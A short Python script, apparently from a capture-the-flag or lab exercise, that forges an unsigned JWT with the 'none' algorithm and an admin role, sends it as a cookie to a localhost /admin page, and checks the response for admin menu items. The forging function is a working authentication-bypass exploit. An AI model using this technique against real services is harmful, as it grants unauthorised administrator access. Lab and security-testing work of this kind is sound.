#!/usr/bin/env python3
"""Test the admin page to see if submenu appears"""

import json
import base64
import time
import urllib.request

def b64url_encode(data):
    json_str = json.dumps(data)
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_jwt(customer_id, role="admin"):
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    h = b64url_encode(header)
    p = b64url_encode(payload)
    return f"{h}.{p}."

# Test /admin page
token = forge_jwt("ADMIN001", "admin")
url = "http://localhost:9443/admin"

print("[*] Requesting /admin page with forged admin JWT")
print(f"    URL: {url}")
print()

try:
    req = urllib.request.Request(url)
    req.add_header('Cookie', f'access_token={token}')
    
    with urllib.request.urlopen(req) as response:
        html = response.read().decode('utf-8')
        
        print("[*] Checking for admin submenu items...")
        print()
        
        checks = {
            "admin-dashboard": 'admin-dashboard' in html,
            "admin-vault": 'admin-vault' in html,
            "admin-audit": 'admin-audit' in html,
            "CTF Vault": 'CTF Vault' in html,
            "Audit Log": 'Audit Log' in html,
        }
        
        for name, found in checks.items():
            status = "YES" if found else "NO"
            print(f"  {name:20} {status}")
        
        print()
        print("[*] Checking page structure...")
        
        # Look for the active admin page indicator
        if 'active' in html and 'admin' in html:
            idx = html.find("'active'")
            if idx > 0:
                snippet = html[idx:idx+50]
                print(f"  Active indicator: {snippet}")
        
        # Find the sidebar/nav section
        if '<aside' in html:
            aside_start = html.find('<aside')
            aside_end = html.find('</aside>', aside_start)
            sidebar = html[aside_start:aside_end+8]
            
            print("\n[*] Sidebar section around submenu area:")
            # Find where the admin links would be
            if 'Admin' in sidebar:
                admin_idx = sidebar.find('Admin')
                start = max(0, admin_idx - 300)
                end = min(len(sidebar), admin_idx + 500)
                print(sidebar[start:end])
            
except Exception as e:
    print(f"ERROR: {e}")
